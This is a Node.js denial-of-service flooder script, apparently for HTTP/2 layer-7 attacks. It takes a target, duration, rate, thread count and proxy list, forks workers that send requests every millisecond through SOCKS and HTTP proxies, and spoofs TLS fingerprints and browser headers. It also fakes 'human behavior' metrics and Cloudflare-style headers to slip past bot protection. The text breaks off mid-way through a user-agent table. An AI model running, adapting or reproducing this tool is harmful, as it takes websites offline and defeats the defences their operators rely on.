const net = require("net");
const http2 = require("http2");
const http = require('http');
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const dns = require('dns');
const fetch = require('node-fetch');
const util = require('util');
const socks = require('socks').SocksClient;
const crypto = require("crypto");
const HPACK = require('hpack');
const fs = require("fs");
const os = require("os");
const colors = require("colors");
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");
function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    settings.forEach(([id, value], i) => {
        data.writeUInt16BE(id, i * 6);
        data.writeUInt32BE(value, i * 6 + 2);
    });
    return data;
}

// ===== HUMAN BEHAVIOR SIMULATION LENGKAP =====
class HumanBehavior {
    constructor() {
        this.viewport = this.getRandomViewport();
        this.devicePixelRatio = this.getRandomDPR();
        this.timezone = this.getRandomTimezone();
        this.language = this.getRandomLanguage();
        this.networkType = this.getRandomNetworkType();
        this.sessionId = this.generateSessionId();
        this.batteryLevel = Math.random() * 0.8 + 0.2;
        this.fonts = this.getRandomFonts();
        this.plugins = this.getRandomPlugins();
        this.webglVendor = this.getRandomWebGLVendor();
        this.webglRenderer = this.getRandomWebGLRenderer();
        this.canvasFingerprint = 'canvas_' + generateRandomString(16, 24);
        this.audioFingerprint = 'audio_' + generateRandomString(16, 24);
        this.mousePositions = [];
        this.scrollPositions = [];
        this.typingSpeed = 0;
        this.readingTime = 0;
        this.pageLoadTime = Date.now();
        this.interactionCount = 0;
        this.lastInteraction = Date.now();
        this.sessionDuration = 0;
        this.pageViews = 1;
        this.currentUrl = '';
        this.referrerChain = [];
        this.bounceRate = Math.random() < 0.3;
        this.dwellTime = Math.floor(Math.random() * 30000) + 5000;
        this.scrollDepth = 0;
        this.maxScrollDepth = Math.random() * 0.8 + 0.2;
        this.mousePath = [];
        this.clickCount = 0;
        this.keypressCount = 0;
        this.tabSwitchCount = 0;
    }

    generateSessionId() {
        return 'session_' + Date.now() + '_' + generateRandomString(8, 12);
    }

    getRandomViewport() {
        const viewports = [
            { width: 1920, height: 1080 }, { width: 1366, height: 768 },
            { width: 1536, height: 864 }, { width: 1440, height: 900 },
            { width: 1280, height: 800 }, { width: 1280, height: 720 },
            { width: 1024, height: 768 }, { width: 2560, height: 1440 },
            { width: 1680, height: 1050 }, { width: 1600, height: 900 },
            { width: 1360, height: 768 }, { width: 1280, height: 1024 },
            { width: 800, height: 600 }, { width: 375, height: 812 },
            { width: 414, height: 896 }, { width: 390, height: 844 }
        ];
        return viewports[Math.floor(Math.random() * viewports.length)];
    }

    getRandomDPR() {
        const dprs = [1, 1.25, 1.5, 1.75, 2, 2.25, 2.5, 3, 3.5];
        return dprs[Math.floor(Math.random() * dprs.length)];
    }

    getRandomTimezone() {
        const timezones = ['America/New_York', 'America/Los_Angeles', 'America/Chicago',
            'Europe/London', 'Europe/Paris', 'Europe/Berlin', 'Asia/Tokyo', 'Asia/Shanghai',
            'Asia/Singapore', 'Australia/Sydney', 'America/Sao_Paulo', 'Asia/Dubai',
            'Europe/Moscow', 'Africa/Johannesburg', 'America/Mexico_City', 'Asia/Seoul'];
        return timezones[Math.floor(Math.random() * timezones.length)];
    }

    getRandomLanguage() {
        const languages = ['en-US,en;q=0.9', 'en-GB,en;q=0.8', 'es-ES,es;q=0.9,en;q=0.8',
            'fr-FR,fr;q=0.9,en;q=0.8', 'de-DE,de;q=0.9,en;q=0.8', 'ja-JP,ja;q=0.9,en;q=0.8',
            'zh-CN,zh;q=0.9,en;q=0.8', 'pt-BR,pt;q=0.9,en;q=0.8', 'ru-RU,ru;q=0.9,en;q=0.8',
            'it-IT,it;q=0.9,en;q=0.8', 'ko-KR,ko;q=0.9,en;q=0.8', 'nl-NL,nl;q=0.9,en;q=0.8'];
        return languages[Math.floor(Math.random() * languages.length)];
    }

    getRandomNetworkType() {
        const types = ['4g', '4g', '4g', '5g', 'wifi', 'wifi', 'ethernet', '3g', '4g', '5g'];
        return types[Math.floor(Math.random() * types.length)];
    }

    getRandomFonts() {
        const fonts = ['Arial, Helvetica, sans-serif', '"Times New Roman", Times, serif',
            'Georgia, serif', 'Verdana, Geneva, sans-serif', 'Roboto, Arial, sans-serif',
            '"Open Sans", Arial, sans-serif', 'Lato, Arial, sans-serif', '"Segoe UI", Arial, sans-serif',
            '"Helvetica Neue", Arial, sans-serif', 'Ubuntu, Arial, sans-serif'];
        const selected = [];
        const count = Math.floor(Math.random() * 3) + 2;
        for (let i = 0; i < count; i++) {
            selected.push(fonts[Math.floor(Math.random() * fonts.length)]);
        }
        return selected.join(';');
    }

    getRandomPlugins() {
        const plugins = ['Chrome PDF Plugin', 'Native Client', 'Widevine Content Decryption Module',
            'Adobe Acrobat', 'Java Applet', 'VLC Web Plugin', 'QuickTime Player',
            'Google Drive', 'Google Docs', 'Amazon Prime Video', 'Netflix Player',
            'Spotify Player', 'Shockwave Flash', 'Silverlight', 'Windows Media Player'];
        const selected = [];
        const count = Math.floor(Math.random() * 4) + 1;
        for (let i = 0; i < count; i++) {
            selected.push(plugins[Math.floor(Math.random() * plugins.length)]);
        }
        return selected.join(', ');
    }

    getRandomWebGLVendor() {
        const vendors = ['Google Inc. (NVIDIA)', 'Intel Corporation', 'AMD', 'NVIDIA Corporation',
            'Apple Inc.', 'Qualcomm', 'ARM', 'Mesa Project', 'Imagination Technologies',
            'Advanced Micro Devices, Inc.', 'NVIDIA Corporation (Apple)'];
        return vendors[Math.floor(Math.random() * vendors.length)];
    }

    getRandomWebGLRenderer() {
        const renderers = [
            'ANGLE (NVIDIA, NVIDIA GeForce RTX 3080 Direct3D11 vs_5_0 ps_5_0)',
            'ANGLE (Intel, Intel(R) UHD Graphics 630 Direct3D11 vs_5_0 ps_5_0)',
            'ANGLE (AMD, AMD Radeon RX 6800 XT Direct3D11 vs_5_0 ps_5_0)',
            'Apple M1 GPU', 'Apple M2 GPU', 'Apple M3 GPU',
            'Qualcomm Adreno 660', 'Qualcomm Adreno 730', 'Qualcomm Adreno 740',
            'ARM Mali-G78', 'ARM Mali-G710', 'ARM Mali-G715',
            'NVIDIA GeForce RTX 4080', 'NVIDIA GeForce RTX 4090',
            'AMD Radeon RX 7900 XT', 'Intel Iris Xe Graphics'
        ];
        return renderers[Math.floor(Math.random() * renderers.length)];
    }

    getHumanDelay() {
        const baseDelay = Math.random() * 750 + 50;
        if (Math.random() < 0.15) {
            return baseDelay + Math.random() * 2000;
        }
        return baseDelay;
    }

    getTypingDelay() {
        return Math.random() * 200 + 100;
    }

    getScrollDepth() {
        return Math.random() * 0.75 + 0.2;
    }

    getMouseMovement() {
        const startX = Math.random() * this.viewport.width;
        const startY = Math.random() * this.viewport.height;
        const endX = Math.random() * this.viewport.width;
        const endY = Math.random() * this.viewport.height;
        return { startX, startY, endX, endY };
    }

    getClickCoordinates() {
        const x = Math.random() * this.viewport.width + (Math.random() - 0.5) * 5;
        const y = Math.random() * this.viewport.height + (Math.random() - 0.5) * 5;
        return { x, y };
    }

    getRefererChain() {
        const sources = [
            'https://www.google.com/search?q=' + generateRandomString(3, 8),
            'https://www.bing.com/search?q=' + generateRandomString(3, 8),
            'https://www.duckduckgo.com/?q=' + generateRandomString(3, 8),
            'https://www.youtube.com/watch?v=' + generateRandomString(11, 11),
            'https://www.facebook.com/',
            'https://www.twitter.com/',
            'https://www.instagram.com/',
            'https://www.reddit.com/r/' + generateRandomString(4, 8),
            'https://www.linkedin.com/',
            'https://www.wikipedia.org/',
            'https://www.tiktok.com/',
            'https://www.pinterest.com/',
            'https://www.tumblr.com/',
            'https://www.quora.com/',
            'https://www.medium.com/'
        ];
        const chain = [];
        const depth = Math.floor(Math.random() * 3) + 1;
        for (let i = 0; i < depth; i++) {
            chain.push(sources[Math.floor(Math.random() * sources.length)]);
        }
        return chain;
    }

    // ===== FUNGSI MOUSE MOVEMENT =====
    simulateHumanMouseMovement(page, element, options = {}) {
        const { minMoves = 5, maxMoves = 10, minDelay = 50, maxDelay = 150, jitterFactor = 0.1, overshootChance = 0.2, hesitationChance = 0.1, finalDelay = 500 } = options;
        // Simulasi gerakan mouse di browser
        if (!element) {
            const bbox = { x: Math.random() * this.viewport.width, y: Math.random() * this.viewport.height, width: 100, height: 50 };
            const targetX = bbox.x + bbox.width / 2;
            const targetY = bbox.y + bbox.height / 2;
            let currentX = Math.random() * this.viewport.width;
            let currentY = Math.random() * this.viewport.height;
            const moves = Math.floor(Math.random() * (maxMoves - minMoves + 1)) + minMoves;
            for (let i = 0; i < moves; i++) {
                const progress = i / (moves - 1);
                let nextX = currentX + (targetX - currentX) * progress;
                let nextY = currentY + (targetY - currentY) * progress;
                nextX += (Math.random() * 2 - 1) * jitterFactor * bbox.width;
                nextY += (Math.random() * 2 - 1) * jitterFactor * bbox.height;
                if (Math.random() < overshootChance && i < moves - 1) {
                    nextX += (Math.random() * 0.5 + 0.5) * (nextX - currentX);
                    nextY += (Math.random() * 0.5 + 0.5) * (nextY - currentY);
                }
                this.mousePositions.push({ x: nextX, y: nextY });
                const delay = Math.floor(Math.random() * (maxDelay - minDelay + 1)) + minDelay;
                if (Math.random() < hesitationChance) {
                    this.interactionCount++;
                }
                currentX = nextX;
                currentY = nextY;
            }
            this.mousePositions.push({ x: targetX, y: targetY });
            return true;
        }
        return false;
    }

    // ===== FUNGSI TYPING =====
    simulateHumanTyping(page, element, text, options = {}) {
        const { minDelay = 30, maxDelay = 100, mistakeChance = 0.05, pauseChance = 0.02 } = options;
        // Simulasi ngetik kayak manusia
        let typedText = '';
        for (let i = 0; i < text.length; i++) {
            const delay = Math.floor(Math.random() * (maxDelay - minDelay + 1)) + minDelay;
            this.typingSpeed += delay;
            if (Math.random() < mistakeChance) {
                const randomChar = String.fromCharCode(97 + Math.floor(Math.random() * 26));
                typedText += randomChar;
                this.keypressCount++;
                this.typingSpeed += delay * 2;
                typedText = typedText.slice(0, -1);
            }
            typedText += text[i];
            this.keypressCount++;
            if (Math.random() < pauseChance) {
                this.typingSpeed += delay * 10;
            }
        }
        return typedText;
    }

    // ===== FUNGSI SCROLLING =====
    simulateHumanScrolling(page, distance, options = {}) {
        const { minSteps = 5, maxSteps = 15, minDelay = 50, maxDelay = 200, direction = 'down', pauseChance = 0.2, jitterFactor = 0.1 } = options;
        const directionMultiplier = direction === 'up' ? -1 : 1;
        const steps = Math.floor(Math.random() * (maxSteps - minSteps + 1)) + minSteps;
        const baseStepSize = distance / steps;
        let totalScrolled = 0;
        for (let i = 0; i < steps; i++) {
            const jitter = baseStepSize * jitterFactor * (Math.random() * 2 - 1);
            let stepSize = Math.round(baseStepSize + jitter);
            if (i === steps - 1) {
                stepSize = (distance - totalScrolled) * directionMultiplier;
            } else {
                stepSize = stepSize * directionMultiplier;
            }
            totalScrolled += stepSize * directionMultiplier;
            this.scrollPositions.push(totalScrolled);
            const delay = Math.floor(Math.random() * (maxDelay - minDelay + 1)) + minDelay;
            if (Math.random() < pauseChance) {
                this.interactionCount++;
            }
        }
        this.scrollDepth = Math.max(this.scrollDepth, Math.abs(totalScrolled) / distance);
        return totalScrolled;
    }

    // ===== NATURAL PAGE BEHAVIOR =====
    simulateNaturalPageBehavior(page) {
        const dimensions = { width: this.viewport.width, height: this.viewport.height, scrollHeight: this.viewport.height * 2.5 };
        const scrollAmount = Math.floor(dimensions.scrollHeight * (0.2 + Math.random() * 0.6));
        this.simulateHumanScrolling(page, scrollAmount, { minSteps: 8, maxSteps: 15, pauseChance: 0.3 });
        const movementCount = 2 + Math.floor(Math.random() * 4);
        for (let i = 0; i < movementCount; i++) {
            const x = Math.floor(Math.random() * dimensions.width * 0.8) + dimensions.width * 0.1;
            const y = Math.floor(Math.random() * dimensions.height * 0.8) + dimensions.height * 0.1;
            this.mousePositions.push({ x, y });
            this.interactionCount++;
        }
        if (Math.random() > 0.5) {
            this.simulateHumanScrolling(page, scrollAmount / 2, { direction: 'up', minSteps: 3, maxSteps: 8 });
        }
        this.pageViews++;
        this.sessionDuration += Math.floor(Math.random() * 5000) + 2000;
        return true;
    }

    // ===== GET HUMAN HEADERS =====
    getHumanHeaders() {
        return {
            "viewport-width": this.viewport.width,
            "viewport-height": this.viewport.height,
            "device-memory": Math.random() < 0.4 ? "8" : Math.random() < 0.3 ? "4" : "16",
            "rtt": Math.floor(Math.random() * 300 + 50),
            "downlink": (Math.random() * 8 + 2).toFixed(1),
            "ect": this.networkType,
            "save-data": Math.random() < 0.3 ? "on" : "off",
            "x-session-id": this.sessionId,
            "x-visitor-id": generateRandomString(16, 24),
            "x-browser-fingerprint": this.canvasFingerprint,
            "x-audio-fingerprint": this.audioFingerprint,
            "x-interaction-count": this.interactionCount,
            "x-page-views": this.pageViews,
            "x-session-duration": this.sessionDuration,
            "x-scroll-depth": Math.min(this.scrollDepth * 100, 95).toFixed(0) + '%',
            "x-mouse-movements": this.mousePositions.length,
            "x-keypress-count": this.keypressCount,
            "x-click-count": this.clickCount,
            "x-tab-switch-count": this.tabSwitchCount,
            "x-dwell-time": this.dwellTime,
            "dpr": this.devicePixelRatio,
            "color-depth": Math.random() < 0.5 ? 24 : 32,
            "timezone": this.timezone,
            "sec-ch-ua-full-version-list": '"Google Chrome";v="134.0.6998.178"',
            "sec-ch-ua-arch": Math.random() < 0.6 ? '"x86"' : '"arm"',
            "sec-ch-ua-bitness": Math.random() < 0.7 ? '"64"' : '"32"',
            "sec-ch-ua-model": Math.random() < 0.3 ? '"SM-G998B"' : '""',
            "sec-ch-ua-platform-version": Math.random() < 0.5 ? "10.0.0" : "15.2.0",
            "sec-ch-ua-wow64": Math.random() < 0.1 ? "?1" : "?0"
        };
    }
}

// ===== FUNGSI GLOBAL UNTUK PANGGILAN EKSTERNAL =====
async function simulateHumanMouseMovement(page, element, options = {}) {
    const human = new HumanBehavior();
    return human.simulateHumanMouseMovement(page, element, options);
}

async function simulateHumanTyping(page, element, text, options = {}) {
    const human = new HumanBehavior();
    return human.simulateHumanTyping(page, element, text, options);
}

async function simulateHumanScrolling(page, distance, options = {}) {
    const human = new HumanBehavior();
    return human.simulateHumanScrolling(page, distance, options);
}

async function simulateNaturalPageBehavior(page) {
    const human = new HumanBehavior();
    return human.simulateNaturalPageBehavior(page);
}
// ===== END HUMAN BEHAVIOR =====

const human = new HumanBehavior();

const urihost = [
    'google.com','youtube.com','facebook.com','baidu.com','wikipedia.org',
    'twitter.com','amazon.com','yahoo.com','reddit.com','netflix.com',
    'instagram.com','tiktok.com','spotify.com','linkedin.com','twitch.tv',
    'discord.com','zoom.us','dropbox.com','microsoft.com','apple.com',
    'cloudflare.com','github.com','stackoverflow.com','quora.com','medium.com',
    'pinterest.com','tumblr.com','snapchat.com','whatsapp.com','telegram.org'
];
clength = urihost[Math.floor(Math.random() * urihost.length)]
function encodeFrame(streamId, type, payload = "", flags = 0) {
    const frame = Buffer.alloc(9 + payload.length);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0) frame.set(payload, 9);
    return frame;
}

function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomIntn(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 }
    
  function randstr(length) {
		const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
		let result = "";
		const charactersLength = characters.length;
		for (let i = 0; i < length; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
		}
		return result;
	}
  function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
 const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
 const randomStringArray = Array.from({ length }, () => {
   const randomIndex = Math.floor(Math.random() * characters.length);
   return characters[randomIndex];
 });

 return randomStringArray.join('');
}

 function randnum(minLength, maxLength) {
    const characters = '0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    const randomStringArray = Array.from({
      length
    }, () => {
      const randomIndex = Math.floor(Math.random() * characters.length);
      return characters[randomIndex];
    });
    return randomStringArray.join('');
  }
    const cplist = [
       "TLS_AES_128_CCM_8_SHA256",
  "TLS_AES_128_CCM_SHA256",
  "TLS_CHACHA20_POLY1305_SHA256",
  "TLS_AES_256_GCM_SHA384",
  "TLS_AES_128_GCM_SHA256"
 ];
 var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
 ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'], ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];
process.on('uncaughtException', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 const sigalgs = [
     "ecdsa_secp256r1_sha256",
          "rsa_pss_rsae_sha256",
          "rsa_pkcs1_sha256",
          "ecdsa_secp384r1_sha384",
          "rsa_pss_rsae_sha384",
          "rsa_pkcs1_sha384",
          "rsa_pss_rsae_sha512",
          "rsa_pkcs1_sha512",
          "ecdsa_secp521r1_sha512",
          "ed25519",
          "rsa_pss_pss_sha256"
] 
  let SignalsList = sigalgs.join(':')
const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448:secp256k1";
const secureOptions = 
 crypto.constants.SSL_OP_NO_SSLv2 |
 crypto.constants.SSL_OP_NO_SSLv3 |
 crypto.constants.SSL_OP_NO_TLSv1 |
 crypto.constants.SSL_OP_NO_TLSv1_1 |
 crypto.constants.SSL_OP_NO_TLSv1_3 |
 crypto.constants.ALPN_ENABLED |
 crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
 crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
 crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
 crypto.constants.SSL_OP_COOKIE_EXCHANGE |
 crypto.constants.SSL_OP_PKCS1_CHECK_1 |
 crypto.constants.SSL_OP_PKCS1_CHECK_2 |
 crypto.constants.SSL_OP_SINGLE_DH_USE |
 crypto.constants.SSL_OP_SINGLE_ECDH_USE |
 crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
 if (process.argv.length < 7){console.log(`Usage: host time req thread proxy.txt `); process.exit();}
 const secureProtocol = "TLS_method";
 const headers = {};
 
 const secureContextOptions = {
     ciphers: ciphers,
     sigalgs: SignalsList,
     honorCipherOrder: true,
     secureOptions: secureOptions,
     secureProtocol: secureProtocol
 };
 
 const secureContext = tls.createSecureContext(secureContextOptions);
 const args = {
     target: process.argv[2],
     time: ~~process.argv[3],
     Rate: ~~process.argv[4],
     threads: ~~process.argv[5],
     proxyFile: process.argv[6],
 }
 
 var proxies = readLines(args.proxyFile);
 const parsedTarget = url.parse(args.target); 
 class NetSocket {
     constructor(){}
 
     async SOCKS5(options, callback) {

      const address = options.address.split(':');
      socks.createConnection({
        proxy: {
          host: options.host,
          port: options.port,
          type: 5
        },
        command: 'connect',
        destination: {
          host: address[0],
          port: +address[1]
        }
      }, (error, info) => {
        if (error) {
          return callback(undefined, error);
        } else {
          return callback(info.socket, undefined);
        }
      });
     }
  HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`;
     const buffer = new Buffer.from(payload);
     const connection = net.connect({
        host: options.host,
        port: options.port,
    });

    connection.setTimeout(options.timeout * 100000);
    connection.setKeepAlive(true, 100000);
    connection.setNoDelay(true)
    connection.on("connect", () => {
       connection.write(buffer);
   });

   connection.on("data", chunk => {
       const response = chunk.toString("utf-8");
       const isAlive = response.includes("HTTP/1.1 200");
       if (isAlive === false) {
           connection.destroy();
           return callback(undefined, "error: invalid response from proxy server");
       }
       return callback(connection, undefined);
   });

   connection.on("timeout", () => {
       connection.destroy();
       return callback(undefined, "error: timeout exceeded");
   });

}
}


 const Socker = new NetSocket();
 
 function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }


 const lookupPromise = util.promisify(dns.lookup);
let val;
let isp;
let pro;

async function getIPAndISP(url) {
    try {
        const { address } = await lookupPromise(url);
        const apiUrl = `http://ip-api.com/json/${address}`;
        const response = await fetch(apiUrl);
        if (response.ok) {
            const data = await response.json();
            isp = data.isp;
        } else {
            return;
        }
    } catch (error) {
        return;
    }
}

const targetURL = parsedTarget.host;

getIPAndISP(targetURL);
const MAX_RAM_PERCENTAGE = 85;
const RESTART_DELAY = 1000;

function getRandomHeapSize() {
    const min = 1000;
    const max = 5222;
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
if (cluster.isMaster) {
    console.clear();
    console.log(`--------------------------------------------`.gray);
    console.log(`Target: `.blue + process.argv[2].white);
    console.log(`Time: `.blue + process.argv[3].white);
    console.log(`Rate: `.blue + process.argv[4].white);
    console.log(`Thread: `.blue + process.argv[5].white);
    console.log(`ProxyFile: `.blue + process.argv[6].white);
    console.log(`--------------------------------------------`.gray);

    const restartScript = () => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }

        console.log('[>] Restarting the script', RESTART_DELAY, 'ms...');
        setTimeout(() => {
            for (let counter = 1; counter <= args.threads; counter++) {
                const heapSize = getRandomHeapSize();
                cluster.fork({ NODE_OPTIONS: `--max-old-space-size=${heapSize}` });
            }
        }, RESTART_DELAY);
    };

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;

        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            console.log('[!] Maximum RAM usage:', ramPercentage.toFixed(2), '%');
            restartScript();
        }
    };

    setInterval(handleRAMUsage, 5000);

    for (let counter = 1; counter <= args.threads; counter++) {
        const heapSize = getRandomHeapSize();
        cluster.fork({ NODE_OPTIONS: `--max-old-space-size=${heapSize}` });
    }
} else {
    setInterval(runFlooder, 1);
}
  function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80";
function randstr(length) {
    const characters = "0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
};
function taoDoiTuongNgauNhien() {
    const doiTuong = {};
    function getRandomNumber(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
  }
  maxi = getRandomNumber(2,3)
    for (let i = 1; i <=maxi ; i++) {
      
      
  
   const key = 'cf-sec-'+ generateRandomString(1,9)
  
      const value =  generateRandomString(1,10) + '-' +  generateRandomString(1,12) + '=' +generateRandomString(1,12)
  
      doiTuong[key] = value;
    }
  
    return doiTuong;
  }
const browsers = [
    "chrome", "safari", "brave", "firefox", "mobile", "opera", "operagx", 
    "edge", "vivaldi", "ucbrowser", "samsung", "duckduckgo", "puffin",
    "avast", "avg", "ccleaner", "epic", "naver", "yandex", "aloha",
    "kiwi", "bromite", "falkon", "midori", "palemoon", "waterfox",
    "librewolf", "tor", "bravenightly", "chrome-canary", "firefox-nightly",
    "opera-crypto", "vivaldi-snapshot"
];
const getRandomBrowser = () => {
    const randomIndex = Math.floor(Math.random() * browsers.length);
    return browsers[randomIndex];
};
const generateHeaders = (browser) => {
    const versions = {
        chrome: { min: 125, max: 134 },
        safari: { min: 17, max: 19 },
        brave: { min: 125, max: 134 },
        firefox: { min: 125, max: 136 },
        mobile: { min: 125, max: 134 },
        opera: { min: 110, max: 118 },
        operagx: { min: 110, max: 118 },
        edge: { min: 125, max: 134 },
        vivaldi: { min: 6, max: 7 },
        ucbrowser: { min: 13, max: 14 },
        samsung: { min: 23, max: 25 },
        duckduckgo: { min: 7, max: 8 },
        puffin: { min: 9, max: 10 },
        avast: { min: 119, max: 124 },
        avg: { min: 119, max: 124 },
        ccleaner: { min: 119, max: 124 },
        epic: { min: 119, max: 124 },
        naver: { min: 4, max: 5 },
        yandex: { min: 23, max: 24 },
        aloha: { min: 3, max: 4 },
        kiwi: { min: 120, max: 125 },
        bromite: { min: 120, max: 125 },
        falkon: { min: 3, max: 4 },
        midori: { min: 10, max: 11 },
        palemoon: { min: 33, max: 35 },
        waterfox: { min: 6, max: 7 },
        librewolf: { min: 125, max: 136 },
        tor: { min: 13, max: 14 },
        bravenightly: { min: 130, max: 140 },
        "chrome-canary": { min: 135, max: 145 },
        "firefox-nightly": { min: 140, max: 150 },
        "opera-crypto": { min: 110, max: 118 },
        "vivaldi-snapshot": { min: 7, max: 8 }
    };

    const version = Math.floor(Math.random() * (versions[browser].max - versions[browser].min + 1)) + versions[browser].min;
    const fullVersions = {
        chrome: "134.0.6998.178",
        safari: "18.3",
        brave: "134.0.6998.178",
        firefox: "136.0.1",
        mobile: "134.0.6998.178",
        opera: "118.0.5995.112",
        operagx: "118.0.5995.112",
        edge: "134.0.3124.83",
        vivaldi: "7.0.3495.23",
        ucbrowser: "14.0.0.118",
        samsung: "25.0.0.45",
        duckduckgo: "8.0.0.1",
        puffin: "10.0.0.10",
        avast: "124.0.0.0",
        avg: "124.0.0.0",
        ccleaner: "124.0.0.0",
        epic: "124.0.0.0",
        naver: "5.0.0.0",
        yandex: "24.0.0.0",
        aloha: "4.0.0.0",
        kiwi: "125.0.0.0",
        bromite: "125.0.0.0",
        falkon: "4.0.0.0",
        midori: "11.0.0.0",
        palemoon: "35.0.0.0",
        waterfox: "7.0.0.0",
        librewolf: "136.0.0.0",
        tor: "14.0.0.0",
        bravenightly: "140.0.0.0",
        "chrome-canary": "145.0.0.0",
        "firefox-nightly": "150.0.0.0",
        "opera-crypto": "118.0.0.0",
        "vivaldi-snapshot": "8.0.0.0"
    };

    const secChUAFullVersionList = Object.keys(fullVersions)
        .map(key => `"${key}";v="${fullVersions[key]}"`)
        .join(", ");
    const platforms = {
        chrome: "Win64",
        safari: "macOS",
        brave: "Linux",
        firefox: "Linux",
        mobile: "Android",
        opera: "Linux",
        operagx: "Linux",
        edge: "Win64",
        vivaldi: "Win64",
        ucbrowser: "Android",
        samsung: "Android",
        duckduckgo: "Android",
        puffin: "Android",
        avast: "Win64",
        avg: "Win64",
        ccleaner: "Win64",
        epic: "Win64",
        naver: "Win64",
        yandex: "Win64",
        aloha: "Android",
        kiwi: "Android",
        bromite: "Android",
        falkon: "Linux",
        midori: "Linux",
        palemoon: "Win64",
        waterfox: "Win64",
        librewolf: "Linux",
        tor: "Win64",
        bravenightly: "Win64",
        "chrome-canary": "Win64",
        "firefox-nightly": "Win64",
        "opera-crypto": "Win64",
        "vivaldi-snapshot": "Win64"
    };
    const platform = platforms[browser];

    const userAgent = {
        chrome: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`,
        safari: `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_${Math.floor(version)}_${Math.floor(Math.random()*5)}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${version}.0 Safari/605.1.15`,
        brave: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`,
        firefox: `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:${version}.0) Gecko/20100101 Firefox/${version}.0`,
        mobile: `Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Mobile Safari/537.36`,
